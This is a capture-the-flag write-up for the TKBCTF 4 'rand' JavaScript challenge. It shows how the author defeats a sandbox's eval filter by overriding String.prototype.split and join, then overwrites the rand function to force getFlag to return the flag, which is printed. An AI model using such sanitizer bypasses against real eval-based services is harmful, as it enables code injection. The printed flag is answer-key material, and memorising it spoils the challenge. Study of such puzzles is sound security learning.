---
title: "TKBCTF 4 - rand"
tags:
  - tkbctf4
  - writeup
  - web
---

First Javascript challenge released out of 2 Javascript challenges.

When connecting to the service at 203.178.132.117:30349, we get the following:

```javascript
$ nc 203.178.132.117 30349
var g = function () {
  var rand = Math.random,
      floor = Math.floor;

  var symbols = [0,0,0,0,0,0,0].map(function (i) {
    return floor(rand() * 6);
  }).map(function (i) {
    return ['&', '%', '*', '@', '#', '$'][i];
  });

  function getFlag () {
    var FLAG = 'FLAG_IS_HIDDEN_HERE';
    return floor(rand() * 100000) === 100000 ? FLAG : 'try again';
  }

  function f (str) {
    eval(str
         .split('(').join(symbols[0])
         .split(')').join(symbols[1])
         .split('=').join(symbols[2])
         .split('*').join(symbols[3])
         .split('&').join(symbols[4])
         .split('"').join(symbols[5])
         .split("'").join(symbols[6]));
  }

  return f.bind(null);
}();

// Good luck!
rand>
```

Now it seems as if we are given a node.js sandbox to play around with and we
need to use the heavily filtered 'g' function to call the 'getFlag' function.
However, we are blocked from doing g("getFlag()") outright because this happens:

```javascript
rand> g("getFlag()")
undefined:1: SyntaxError: Unexpected token ILLEGAL
getFlag@#
       ^
SyntaxError: Unexpected token ILLEGAL
    at f (/home/nodejs/problems/rand.js:24:22)
    at (d8):1:1
```

Looks like all interesting characters like () and = are replaced with other
characters.

Let's explore the environment.

```javascript
rand> Object.keys(this)
["print", "quit", "version", "arguments", "g"]
```

Looks pretty locked down. But they are kind enough to provide a 'print'
function. We can use that to print the results of getFlag() later.

Now, we can bypass the filtering by overriding the split and join methods of the
String prototype.

```javascript
rand> String.prototype.split = function(i) { return this.toString()}
function (i) { return this.toString()}
rand> String.prototype.join = function(i) { return this.toString()}
function (i) { return this.toString()}
rand> g("print(getFlag())")
try again
undefined
rand>
```

As you can see we have achieved calling the getFlag() function. But to get the
flag, we need to ensure that rand() returns 1 consistently. We can do this by
replacing the rand variable with our own function and then calling the getFlag
function to get our flag!

```javascript
rand> g("rand = function() {return 1}")
undefined
rand> g("print(getFlag())")
FLAG{7f94427ec6f49f70642d41c675b98832}
undefined
rand>
```

Flag: **FLAG{7f94427ec6f49f70642d41c675b98832}**
